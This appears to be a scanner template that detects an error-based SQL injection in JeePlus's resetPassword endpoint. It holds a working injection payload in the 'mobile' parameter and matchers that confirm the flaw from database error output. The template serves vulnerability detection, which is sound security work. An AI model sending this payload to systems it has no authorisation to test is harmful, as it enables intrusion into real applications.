id: poc-yaml-jeeplus-resetpassword-sqli
info:
  name: JeePlus ResetPassword SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /a/sys/user/resetPassword?mobile=18888888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{t1}})),0x7e),1))%23 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "XPATH syntax error"
          - "Error querying database"
          - "{{substr(t2, 0, 31)}}"
